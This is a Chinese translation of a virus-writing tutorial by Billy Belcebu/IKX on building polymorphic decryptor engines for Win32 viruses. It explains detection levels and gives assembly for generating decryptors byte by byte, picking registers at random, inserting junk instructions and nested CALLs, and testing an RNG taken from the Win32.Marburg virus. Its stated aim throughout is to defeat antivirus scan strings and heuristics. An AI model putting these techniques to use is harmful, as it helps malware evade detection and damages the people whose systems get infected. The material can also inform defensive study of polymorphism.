
# Win32 下的多态变形

> 原文：[`www.pediy.com/kssd/pediy08/pediy8-751.htm`](https://www.pediy.com/kssd/pediy08/pediy8-751.htm)

**Win32 多态变形**

Billy Belcebu/IKX

好，许多人告诉我，在我的 MS-DOS 教程中最大的弱点就是多态变形一章（是啊，我写它的时候是 15 岁，顺便说一声，当时我了解 `ASM` 仅仅一个月）。我知道，就为这个原因，我正在尽我的努力写另外一篇，完全新的，没有任何参考的文章。之前，我读过许多关于多态变形的文件，没有什么疑问，给我印象最深的一篇是 Qozah 的，尽管这篇文章很简单，但它解释清楚了当编写多态引擎时我们不得不搞明白的概念。（如果你愿意阅读它，可以从[`www.madchat.org/vxdevl/vdat/ezines1.htm#DDT`](http://www.madchat.org/vxdevl/vdat/ezines1.htm#DDT)下载）。

## %介绍%

多态性存在的主要原因总是与杀毒软件的存在相关联。在多数情况下，如果没有多态引擎，杀毒软件就可以使用扫描字符串来侦测病毒，更重要的是它可以解码病毒。因此，某天一个 `VX` 有了一个伟大的主意。我相信他想：“为什么不能制造一个不能被扫描的病毒，至少对于目前的技术不能被扫描？”就这样多态产生了。多态意味着试图消除所有可能的常量字节，这些常量字节是能被解密器扫描到的病毒加密部分字节。是的，多态意味着为病毒建立变量解密表。Heh,简单而有效。这是基本概念：从来不要建立两个相等的解密表，但是要提供相同的行为。是否象加密的自然扩展，但是作为加密代码常常不是足够的短，他们能被使用字符串的方法找到，但是使用多态，字符串就没有用了。

## %多态级别%

杀毒软件的制造者们给出了每一多态级别的名字。下面大家一起来看 `AVPVE` 的一些特征。

依据解密这些病毒的代码的复杂程度可以将多态病毒进行系统的划分。`Dr.Alan Solomon` 介绍了这样一个系统，`Vesselin Bontchev` 进行了加强完善。

级别 1：病毒含有一系列的带有常量代码的解码表，选择其中的一个进行感染。这样的病毒叫做"semi-polymorphic"或者"oligomorphic"。例如："Cheeba", "Slovakia", "Whale"。

级别 2：病毒解码表包含一条或者多条常量指令，其余是可变的。

级别 3：解码表包含无用函数如：`NOP`, `CLI`, `STI`, etc

级别 4：解码表使用内部可变指令和改变它们的顺序（指令混合）。解密算法保持不变。

级别 5：使用了所有上面提到的技术，解密算法可变，重复病毒代码加密，甚至部分解密代码也进行加密。

级别 6：永久病毒。病毒的主要代码不断改变，它被分成不同的块，这些块的位置在感染过程中是随机产生的。尽管这样，病毒仍能够继续运行，这些病毒可能没有加密。

这样的划分仍有缺点，因为主要标准是依据解码代码探测病毒的可能性，使用了传统的病毒掩码技术：

级别 1：为了侦测病毒，有许多的掩码是有效的。

级别 2：使用”wild cards”进行带有掩码帮助的病毒侦测。

级别 3：在删除花指令后，采用带有掩码帮助的病毒侦测。

级别 4：掩码包含许多版本可能代码，这些就变成了算法。

级别 5：不可能使用掩码进行病毒检测。

这样一种划分的不充分性在病毒的多态性的第三级别被证明，被称为“Level3”。这种病毒作为极其复杂的多态病毒中的一种依据目前的划分方法被划分到第三种类别，主要是因为它使用了常量解码算法，使用了许多花指令。然而在这种病毒中花指令的生成算法是极其完美的：在解码代码中你可以发现几乎所有的 `i8086` 指令。

如果病毒被从杀毒软件的角度被划分成各种级别，使用系统自动解密病毒代码，这样这种划分将依靠病毒代码的复杂程度。其它病毒侦测技术是可能的，例如，解码使用基本数学原则的帮助，等等。

因此，我的划分思想是更加的客观，除了病毒的掩码标准，其他参数也考虑近来了。

1. 多态性代码的复杂程度。（处理器指令在所有代码中的比例，这可能在解码代码中遇到）
2. 抗模仿技术的使用程度。
3. 解码算法的稳定性
4. 解码的规模大小

我不想将这些条目描写的过于详细，因为它将明确的导致病毒制造者写出这种病毒。

## %我怎样做这种多态%

首先，你必须在你的脑海中知道你的解码器的原形。例如：

```asm
mov     ecx,virus_size
```

```asm
        lea     edi,pointer_to_code_to_crypt
```

```asm
        mov     eax,crypt_key
```

```asm
 @@1:   xor     dword ptr [edi],eax
```

```asm
        add     edi,4
```

```asm
        loop    @@1
```

一个简单的例子，好吗？好的，这里有 6 个块（每一条指令一个块）。想一下有多少不同的代码可能：

* 改变寄存器
* 改变前三条指令的顺序
* 使用不同的代码来产生相同的效果
* 插入空指令
* 插入花指令，等等

好的，这就是多态思想的主要部分。让我们看一下，使用简单的多态引擎的解码器生成过程，使用相同的解码器：

```asm
 shl     eax,2
```

```asm
        add     ebx,157637369h
```

```asm
        imul    eax,ebx,69
```

```asm
 (*)    mov     ecx,virus_size
```

```asm
        rcl     esi,1
```

```asm
        cli
```

```asm
 (*)    lea     edi,pointer_to_code_to_crypt
```

```asm
        xchg    eax,esi
```

```asm
 (*)    mov     eax,crypt_key
```

```asm
        mov     esi,22132546h
```

```asm
        and     ebx,0FF242569h
```

```asm
 (*)    xor     dword ptr [edi],eax
```

```asm
        or      eax,34548286h
```

```asm
        add     esi,76869678h
```

```asm
 (*)    add     edi,4
```

```asm
        stc
```

```asm
        push    eax
```

```asm
        xor     edx,24564631h
```

```asm
        pop     esi
```

```asm
 (*)    loop    00401013h
```

```asm
        cmc
```

```asm
        or      edx,132h
```

```asm
        [...]
```

你了解了其中的含义了吗？好，对于杀毒软件，找到这样的解码器不是很困难（好，更为困难的是一个没有未加密的病毒）。许多地方需要改进，相信我。我想你已经认识到在你的多态引擎需要不同的过程：一个为你产生“合法”的解码指令，一个为你生成垃圾指令。这是你在编制多态引擎时必须掌握的主要思想。从这一点出发，我将继续尽我所能解释这一点。

## %非常重要的事情：随机数%

是的，在多态引擎中最重要的部分是随机数生成器，叫做 `RNG`。一个 `RNG` 是一段返回完整随机数的代码。下面是一段典型的 `DOS` 代码，也可以在 `Win9X` 中使用，甚至在 `Ring-3` 级，但是不能在 `NT` 下。

```asm
random:
        in      eax,40h
        ret
```

它将在 `EAX` 的高字节中返回 `0`，在 `EAX` 的低字节中返回一个随机数。但这不是很强大的。。。必须看另外一个。。。这个适合你。唯一的在这一点我能做的是告诉你如何知道使用一段程序判断你的 `RNG` 是不是强大。它包含了一个 `Win32.Marburg` payload (by `GriYo/29A`)的"rip"，和 `GriYo` too 测试这个病毒的 `RNG`。当然这段代码被采用和完整脱掉，能够很容易地编译和执行。

；\------\[从这里剪切\]--------------

```
;
; RNG Tester
;  ---------?
;
; If the icons on the screen are really "randomly"  placed, the RNG is a good
; one, but if all the icons are in the same zone of the screen, or you notice
; a strange comportament of the icons  over the screen, try with another RNG.
;
```

```
        .386
        .model  flat
```

```
res_x   equ     800d                                 ; Horizontal resolution
res_y   equ     600d                                 ; Vertical resolution
```

```
extrn   LoadLibraryA:PROC                       ; All the APIs needed by the
extrn   LoadIconA:PROC                          ; RNG tester
extrn   DrawIcon:PROC
extrn   GetDC:PROC
extrn   GetProcAddress:PROC
extrn   GetTickCount:PROC
extrn   ExitProcess:PROC
```

```
        .data
```

```
szUSER32        db    "USER32.dll",0             ; USER32.DLL ASCIIz string
```

```
a_User32        dd      00000000h                ; Variables needed
h_icon          dd      00000000h
dc_screen       dd      00000000h
rnd32_seed      dd      00000000h
rdtsc           equ     <dw 310Fh>
```

```
        .code
```

```
RNG_test:
    xor     ebp,ebp                     ; Bah, i am lazy and i havent
                                         ; removed indexations of the
                                         ; code... any problem?
```

```
        rdtsc
         mov     dword ptr [ebp+rnd32_seed],eax
```

```
        lea     eax,dword ptr [ebp+szUSER32]
        push    eax
        call    LoadLibraryA
```

```
        or      eax,eax
        jz      exit_payload
```

```
        mov     dword ptr [ebp+a_User32],eax
```

```
        push    32512
        xor     edx,edx
        push    edx
        call    LoadIconA
        or      eax,eax
        jz      exit_payload
```

```
        mov     dword ptr [ebp+h_icon],eax
```

```
        xor     edx,edx
        push    edx
        call    GetDC
        or      eax,eax
        jz      exit_payload
        mov     dword ptr [ebp+dc_screen],eax
```

```
        mov     ecx,00000100h                ; Put 256 icons in the screen
```

```
loop_payload:
```

```
        push    eax
        push    ecx
        mov     edx,eax
        push    dword ptr [ebp+h_icon]
        mov     eax,res_y
        call    get_rnd_range
        push    eax
        mov     eax,res_x
        call    get_rnd_range
        push    eax
        push    dword ptr [ebp+dc_screen]
        call    DrawIcon
        pop     ecx
        pop     eax 
         loop    loop_payload
```

```
exit_payload:
        push    0
        call    ExitProcess
```

```
; RNG - This example is by GriYo/29A (see Win32.Marburg)
;
; For test the validity of your RNG, put its code here ;)
;
```

```
random  proc
         push    ecx                        

         push    edx                        

         mov     eax,dword ptr [ebp+rnd32_seed]

         mov     ecx,eax

         imul    eax,41C64E6Dh

         add     eax,00003039h

         mov     dword ptr [ebp+rnd32_seed],eax

         xor     eax,ecx

         pop     edx

         pop     ecx

         ret

random  endp
```

```
        
```

```
get_rnd_range proc

        push    ecx

        push    edx

        mov     ecx,eax

        call    random

        xor     edx,edx

        div     ecx

            mov     eax,edx 

         pop     edx

         pop     ecx

```



## 多态引擎的基本概念

我想你应该知道我将要解释什么，因此，如果你已经编写过多态引擎，或者你知道如何创建它，我忠言劝告你略过这一部分，或者你不在乎我的意见，但我不想这样。

好，首先，我将生成在通用堆中建立一个临时缓冲区的代码，使用 API 函数 `VirtualAlloc` 和 `GlobalAlloc` 可以很容易地分配内存。我们只需要在这段区域的开始部分放置一个指针，这个指针通常是 `EDI`，最好使用 `STOS` 系列指令。因此，我们不得不将伪代码的字节数放入内存缓冲区。好，好，可能你仍然认为我是一个傻子，因为我没有给出代码的示例，我将证明你是错误的。

```assembly
;---[ 从这里剪切]----------------------------------------------
;
; Silly PER basic demonstrations (I)
;  ---------------------------------?
;
        .386                             ; Blah
        .model  flat
        .data

shit:
buffer  db     00h
        .code
Silly_I:
        lea     edi,buffer               ; Pointer to the buffer
        mov     al,0C3h                  ; Byte to write, in AL
        stosb                            ; Write AL content where EDI
                                         ; points
        jmp     shit                     ; As the byte we wrote, C3,
                                         ; is the RET opcode, we fi-
                                         ; nish the execution.
end     Silly_I
;---[从这里剪切 ]--------------------------------------------
```

编译前面的代码看看有什么发生。？我知道什么都没有做。但是你看到没有直接编写生成的代码，证明从没有生成代码，想一想这种可能性，你能在缓冲区生成一个完全有用的代码。这就是多态引擎的如何生成解码代码的基本概念。因此，想想一下，我们想生成我们想要的指令序列的代码：

```assembly
     mov     ecx,virus_size
        mov     edi,offset crypt
        mov     eax,crypt_key
 @@1:  xor     dword ptr [edi],eax
        add     edi,4
        loop    @@1
```

这样，基本的生成解码器的代码如下：

```assembly
mov     al,0B9h   ; MOV ECX,imm32 opcode
stosb            ; Store AL where EDI points
mov     eax,virus_size          ; The imm32 to store
stosd            ; Store EAX where EDI points
mov     al,0BFh                 : MOV EDI,offset32 opcode
stosb            ; Store AL where EDI points
mov     eax,offset crypt        ; Offset32 to store
stosd            ; Store EAX where EDI points
mov   al,0B8h                  ; MOV EAX,imm32 opcode
stosb            ; Store AL where EDI points
mov     eax,crypt_key           ; Imm32 to store
stosd            ; Store EAX where EDI points
 mov    ax,0731h               ; XOR [EDI],EAX opcode
 stosw            ; Store AX where EDI points
 mov     ax,0C783h              ; ADD EDI,imm32 (>7F) opcode
 stosw            ; Store AX where EDI points
 mov     al,04h                 ; Imm32 (>7F) to store
 stosb            ; Store AL where EDI points
 mov     ax,0F9E2h              ; LOOP @@1 opcode
 stosw            ; Store AX where EDI points
```

好的，这样你已经生成它想要生成的代码，可是你也认识到，通过使用相同的方法很容易增加空指令在现有指令中。你可能使用一字节指令进行实验，例如，看看它的能力。

```assembly
;---[ 从这里剪切]---------- ----------------------------------------
;
; Silly PER basic demonstrations (II)
;  ----------------------------------?
;

        .386                           ; Blah
        .model  flat

virus_size     equ     12345678h      ; Fake data
crypt          equ     87654321h
crypt_key      equ     21436587h

        .data

        db     00h

        .code

Silly_II:

   lea     edi,buffer               ; Pointer to the buffer
                                         ; is the RET opcode, we fi-
                                         ; nish the execution.

   mov     al,0B9h                  ; MOV ECX,imm32 opcode
   stosb                            ; Store AL where EDI points
   mov     eax,virus_size           ; The imm32 to store
   stosd                            ; Store EAX where EDI points

   call    onebyte

   mov     al,0BFh                  ; MOV EDI,offset32 opcode
   stosb                            ; Store AL where EDI points

 mov     eax,crypt                 ; Offset32 to store
 stosd                            ; Store EAX where EDI points

 call    onebyte

 mov     al,0B8h                  ; MOV EAX,imm32 opcode
 stosb                            ; Store AL where EDI points
 mov     eax,crypt_key
 stosd                            ; Store EAX where EDI points

        call    onebyte

    mov     ax,0731h               ; XOR [EDI],EAX opcode
    stosw                            ; Store AX where EDI points

   mov     ax,0C783h              ; ADD EDI,imm32 (>7F) opcode
      stosw                      ; Store AX where EDI points
   mov     al,04h                 ; Imm32 (>7F) to store
   stosb                            ; Store AL where EDI points

   mov     ax,0F9E2h              ; LOOP @@1 opcode
   stosw                      ; Store AX where EDI points

        ret

random:
        in      eax,40h                  ; Shitty RNG
        ret

onebyte:
    call    random                  ; Get a random number
    and     eax,one_size           ; Make it to be [0..7]
    mov     al,[one_table+eax]      ; Get opcode in AL
    stosb                            ; Store AL where EDI points
    ret

one_table       label byte            ; One-byters table
        lahf
        sahf
        cbw
        clc
        stc
        cmc
        cld
        nop
one_size        equ     ($-offset one_table)-1

buffer  db     100h dup (90h)             ; A simple buffer

end     Silly_II
;---[ 从这里剪切]--------------------------------------------------
```

呵呵，我建立了一个弱三级的多态，二级趋势：）！！寄存器交换将在后面解释，像使用伪代码格式。但是在这一小节的目标是：你应该知道你想做什么的思想。假定你用两字节代替一字节，如 `PUSH REG`/`POP REG`, `CLI`/`STI`, 等等。

## “实”代码生成

让我们看看我们的指令序列

```assembly
mov     ecx,virus_size             ; (1)
        lea    edi,crypt          ; (2)
        mov     eax,crypt_key     ; (3)
 @@1:  xor     dword ptr [edi],eax     ; (4)
        add     edi,4             ; (5)
        loop    @@1             ; (6)
```

为了执行相同的动作，但是使用不同的代码，许多许多事情可以做，这是客观的。例如，前三条指令可以使用排序中的任何其它形式，结果不会改变，因此你能生成一段随机顺序生成函数。我们也可以使用其它寄存器序列，也没有任何问题。我们也可以使用 `dec/jnz` 代替 `loop`…等等。

- 例如，你的代码应能生成，其它的象这样的代码也能产生一个简单指令，下面来看，第一个 `mov`:

```assembly
      mov     ecx,virus_size
 or
        push    virus_size
        pop     ecx
 or
        mov     ecx,not (virus_size)
        not     ecx
 or
        mov     ecx,(virus_size xor 12345678h)
        xor     ecx,12345678h
```

等等。。。

所以这些都生成不同的伪代码，但完成相同的任务，也就是说，在 `ECX` 中放置病毒的大小。当然，有许多的可能性，因为你可以使用大量的代码仅仅只是在一个寄存器中置入一个固定的值。它需要很多的想想。



另一件事情是指令的顺序。正如前面提到的，你可以很容易地改变指令的顺序而不会有任何问题，因为指令的顺序不是问题。因此，例如，代替指令序列 `1, 2, 3` 我们能代替它为 `3, 2, 1` 或者 `1, 3, 2` 等等。

另一重要的事情是交换寄存器，因为伪指令改变可以是每条伪指令（例如：`MOV EAX,imm32` 被编译成 `B8 imm32` 然而 `MOV ECX,imm32` 被编译成 `B9 imm32`）。你应该从 7 个寄存器中为解码器选择 3 个（*从不*使用 `ESP`!!!）。例如，假定我选择（随机）3 个寄存器，`EDI` 作为基址指针，`EBX` 作为关键字和 `ESI` 作为计数器；这时我们可以使用 `EAX`、`ECX`、`EDX` 和 `EBP` 作为生成垃圾指令的花指令寄存器。让我们来看一个为我们的解码器选择 3 个寄存器例子：

```assembly
InitPoly       proc
```

```assembly
@@1:   mov     eax,8                       ; Get a random reg
```

```assembly
call    r_range                 ; EAX := [0..7]
```

```assembly
cmp     eax,4                   ; Is ESP?
```

```assembly
jz      @@1                     ; If it is, get another reg
```

```assembly
mov     byte ptr [ebp+base],al      ; Store it
mov     ebx,eax                 ; EBX = Base register
```

```assembly
@@2:   mov     eax,8                       ; Get a random reg
```

```assembly
call    r_range                 ; EAX := [0..7]
```

```assembly
cmp     eax,4                   ; Is ESP?
```

```assembly
jz      @@2                     ; If it is, get another one
```

```assembly
cmp     eax,ebx                 ; Is equal to base pointer?
```

```assembly
jz      @@2                     ; If it is, get another one
```

```assembly
mov     byte ptr [ebp+count],al   ; Store it
mov     ecx,eax                 ; ECX = Counter register
```

```assembly
@@3:   mov     eax,8                       ; Get random reg
```

```assembly
call    r_range                 ; EAX := [0..7]
```

```assembly
cmp     eax,4                   ; Is it ESP?
```

```assembly
jz      @@3                     ; If it is, get another one
```

```assembly
cmp     eax,ebx                 ; Is equal to base ptr reg?
```

```assembly
jz      @@3                     ; If it is, get another reg
```

```assembly
cmp     eax,ecx                 ; Is equal to counter reg?
```

```assembly
jz      @@3                     ; If it is, get another one
```

```assembly
mov     byte ptr [ebp+key],al       ;存储
```

```assembly
ret
```

```assembly
InitPoly       endp
```

现在有 3 个变量 3 个不同的寄存器我们能够自由的使用而没有任何问题。使用 `EAX` 寄存器，就会有问题，不是很重要，但是实际是有问题的。正如你所了解的，`EAX` 和其它的一些指令有其优化的执行代码。这不是问题，因为代码执行变的平等了，但是启发式教学注意到一些伪代码被建立在错误的方式，这种方式是一个“实”汇编器从来都没有的。你有两种选择：如果你坚持想用 `EAX`，例如，作为你代码中一个“活动”的寄存器，如果可能你应该对它检查、优化，或者避免使用 `EAX` 寄存器作为解码器的“活动“寄存器，仅仅用它产生垃圾代码，直接使用它的优化代码（使用它建立一个表是很好的选择）。我们后面来看这一点。我推荐使用掩码寄存器，作为最终垃圾游戏：)。

### %垃圾生成%

垃圾的质量占了多态引擎质量的 90%。是的，我说的是“质量”而不是你所想的“数量”。首先我将提供你在编写多态引擎时的两个建议：

- 生成切合实际的代码，使用表面上合法的应用程序代码。例如，GriYo 的引擎。
- 生成尽可能多的指令，使用表面上不标准的文件（使用协处理器）。例如，Mental Driller 的 MeDriPoLen (see Squatter).

好的，下面让我们开始：

#### Common for both

- `CALLs` (and `CALLs` within `CALLs` within `CALLs`...) in many different ways
- Unconditional `JMPs`

#### Realism

某些现实的东西是看起来实际的，尽管它不是。使用这一点我来解释下面的：如果你看到没有 `CALLs` 和 `JUMPs` 的大量代码，你怎么想？如果在一个 `CMP` 后，没有条件跳转，你又怎么想？正如你，我，杀毒软件了解的，这几乎不可能。因此，我们必须能生成所有这种类型的垃圾结构：

- `CMP`/条件跳转
- `TEST`/条件跳转
- 如果使用 `EAX`，就总使用其优化指令
- 使用内存存取
- 生成 `PUSH`/garbage/`POP` 结构
- 生成非常少的一字节指令(如果可能)

#### Mental Drillism... ehrm... Corrupt code likeness

这些在解码器充满垃圾指令的情况发生，伪代码使它不象代码，也就是说，不遵守前面列表的规则，使用协处理器的无用指令，当然，也使伪指令尽可能多。

好，下面我将解释代码生成的关键点。首先，来看所有与其关联的点，`CALLs` 和无条件跳转。

在第一点中，`CALLs` 是非常简单的，你能完成它，将 `CALLs` 作成子程序，可通过许多方法：

```
. Figure 1 -------.      . Figure 2 -------.        . Figure 3 -------.
|      call   @@1 |   |      jmp    @@2 |        |      push   @@2 |
|      ...        |   |      ...        |        |      ...        |
|      jmp    @@2 |   | @@1:           |        | @@1:           |
|      ...        |   |      ...        |        |      ...        |
| @@1:           |   |      ret        |        |      ret        |
|      ...        |   |      ...        |        |      ...        |
|      ret        |   | @@2:           |        |      ...        |
|      ...        |   |      call   @@1 |        |       call   @@1 |
'-----------------'   '-----------------'        '-----------------'
```

当然你可以混合使用，你有很多种方法在解码器中加入子程序。当然，你也可能陷入 recursivity（你将听到我多次谈到这一点），也可能在 `CALLs` 中调用 `CALLs`，所有在内部的其它 `CALLs`，可能是最让人头痛的。

顺便说一下，一个好的建议是存储子程序的偏移地址，在生成的代码中的任何地方调用。

关于无条件跳转，这也很容易，由于我们不需要考虑跳转后到跳转范围的指令，我们可以插入完整的随机代码，例如 trash.。。。

下面我将讨论代码中的实现。GriYo 可以称做这方面最伟大的组件；如果你了解他的 Marburg 引擎，或者 HPS，你将认识到，尽管它和简单，它尽力是代码和实际一样，这使得杀毒软件很难得到它的真实算法。好的，让我们来看一些基本点：

有关‘CMP/条件跳转’结构，它非常清楚，因为如果你不使用条件跳转就不会使用比较指令。。。，好，但是尽量使跳转在非零情况下发生，也就是说，在条件跳转和偏移之间生成一些垃圾指令，这样代码在分析者的眼里就会很少有怀疑。

同样使用 `TEST`，而是使用 `JZ` 或 `JNZ`，正如你知道的，`TEST` 仅仅只影响零标志。

产生错误的一种最简单的方法是使用 `AL`/`AX`/`EAX` 寄存器，因为它有它自己的优化代码。下面是一些例子：

```
ADD, OR, ADC, SBB, AND, SUB, XOR, CMP 和 TEST (Immediate to register).
```

有关内存存取，一个比较好的选择是在被感染的 PE 文件中获得至少 512 字节的空间，将病毒放置在其中，赋予读和写的权限。尽量避免使用简单的指数，倍数关系，如果你能理解它，尽量使用二指数进行乘法，如`[ebp+esi*4]`。不是你所想的越困难越好，相信我。你也可以使用内存移动，直接使用 `MOVS`，也可以使用 `STOS`，`LODS`, `CMPS`...所有字符串操作指令，由你决定。

`PUSH`/TRASH/`POP` 结构非常有用，因为其添加到引擎的简单性，也因为其好的结果，由于它在合法程序中是非常正常的结构。

一字节的数量，如果太多，就会引起杀毒软件和一些好奇的人的注意，知道我们的存在。考虑到正常的程序通常不使用它们，因此最好做一个检查，避免过多的使用，但是在 1 到 2 个每 25 字节情况下（我认为这是一个很好的比例）仍然可以使用。

你可以使用下面的 2 字节协处理器指令产生垃圾代码而没有任何错误：

`f2xm1`, `fabs`, `fadd`, `faddp`, `fchs`, `fnclex`, `fcom`, `fcomp`, `fcompp`, `fcos`, `fdecstp`, `fdiv`, `fdivp`, `fdivr`, `fdivrp`, `ffree`, `fincstp`, `fld1`, `fldl2t`, `fldl2e`, `fldpi`, `fldln2`, `fldz`, `fmul`, `fmulp`, `fnclex`, `fnop`, `fpatan`, `fprem`, `fprem1`, `fptan`, `frndint`, `fscale`, `fsin`, `fsincos`, `fsqrt`, `fst`, `fstp`, `fsub`, `fsubp`, `fsubr`, `fsubrp`, `ftst`, `fucom`, `fucomp`, `fucompp`, `fxam`, `fxtract`, `fyl2x`, `fyl2xp1`.

只要在病毒代码开始时加入下面两条指令以重置协处理器：

```assembly
Fninit
```

Mental Driller 很快将进入现实，使用它的最新的令人钦佩的引擎（TUAREG），因此。。。

### %指令建立%

这可能是与多态关系最紧密的：使用不同寄存器的相同指令或者同一家族中的两条指令之间都是存在关系的。如果我们给出这些指令的二进制代码，那么它们之间的关系就非常清晰了。

```
Regs in binary > 000 001 010 011 100 101 110 111
                  vvv vvv vvv vvv vvv vvv vvv vvv
 Byte registers > AL  CL  DL  BL  AH  CH  DH  BH
 Word registers > AX  CX  DX  BX  SP  BP  SI  DI
 Extended regs  > EAX ECX EDX EBX ESP EBP ESI EDI
 Segments       > ES  CS  SS  DS  FS  GS  --  --
 MMX registers  > MM0 MM1 MM2 MM3 MM4 MM5 MM6 MM7
```

好，我想在我的 MS-DOS 病毒编写教程系列中的最大错误是第一部分的伪代码结构。我想在这里描述的是"do it yourself"，完全由我来写多态引擎。仅仅来看一个 `XOR` 的例子。。。

```assembly
xor     edx,12345678h -> 81 F2 78563412
```

```assembly
xor     esi,12345678h -> 81 F6 78563412
```

看到有什么不一样了吗？我习惯进行调试，然后写伪代码，我想重新使用一些寄存器，看看有什么改变。好的，正如你看到的（嘿！你没有建立，是吗？）改变的字节是第二个字节。来看：将它化为二进制。

```
F2 -> 11 110 010
```

```
F6 -> 11 110 110
```

好，你看到变化了吗？最后三位？好，现在回到存放寄存器二进制代码的地方：) 你已经认识到，根据寄存器的值有三位改变了。因此。。。

010 -> `EDX` reg
110 -> `ESI` reg

仅仅只需要将其它的二进制值放入这三位就可以看到寄存器的变化。但是小心，不要使用 `EAX` 的值(000)，因为所有的数学运算指令，都优先使用 `EAX`，因此这种改变将全部改变伪代码。另外，如果你使用 `EAX`, the heuritics will flag it (anyways it will work, but...).

因此，调试所有你的结构，看看它们之间的联系，为生成任何事情建立一个实际代码，非常容易！

### %递归性%

递归性也是多态引擎的一个重要点。递归必须有一个限度，仅依靠这个限度，跟踪代码就会很困难（如果限度很高）。假想我们有一个所有花指令的偏移表：

```assembly
PolyTable:
dd      offset (GenerateMOV)
dd      offset (GenerateCALL)
dd      offset (GeneratteJMP)
[...]
EndPolyTable:
```

有下面的程序来在这些指令中选择：

```assembly
GenGarbage:
mov     eax,EndPolyTable-PolyTable
call    r_range
lea     ebx,[ebp+PolyTable]
mov     eax,[ebx+eax*4]
add     eax,ebp
call    eax
ret
```

现在假定你的‘GenerateCALL’指令调用是在‘GenGarbage’程序的内部。嘿，‘GenGarbage’程序能继续调用‘GenerateCALL’，重复调用（依靠 RNG），你将嵌套 CALLs…，我在前面提到的限度问题只是为了避免速度，但是可以很容易地被下面的新‘GenGarbage’程序解决：

```assembly
GenGarbage:
inc     byte ptr [ebp+recursion_level]
cmp     byte ptr [ebp+recursion_level],05 ; <- 5 是递归级别
```



```
        jae     GarbageExit
```

```
 
```

```
        mov     eax,EndPolyTable-PolyTable
```

```
        call    r_range
```

```
        lea     ebx,[ebp+PolyTable]
```

```
        mov     eax,[ebx+eax*4]
```

```
        add     eax,ebp
```

```
        call    eax
```

```
 
```

```
GarbageExit:
```

```
        dec     byte ptr [ebp+recursion_level]
```

```
        ret
```

因此，我们的引擎能够生成大量的含有 `calls` 的垃圾代码:)，当然，这些也能应用在 `PUSH` 和 `POP` 之间。

### 结束语

多态性定义了代码，因此，我不再多说。自己去做而不是仅仅拷贝代码。不仅仅去做典型的使用一种简单加密操作类型和基本花指令例如 `MOV` 等的引擎。使用所有你能想到的方法。例如，有许多类型的 `Calls` 可以去做：三种方式（前面描述的），除了这些还有，你可以建立堆栈框架，`PUSHAD/POPAD`,由 `PUSH` 传递参数,等等，随你了!

`4dd466d0e1e0cc123afbe504da2462ca`
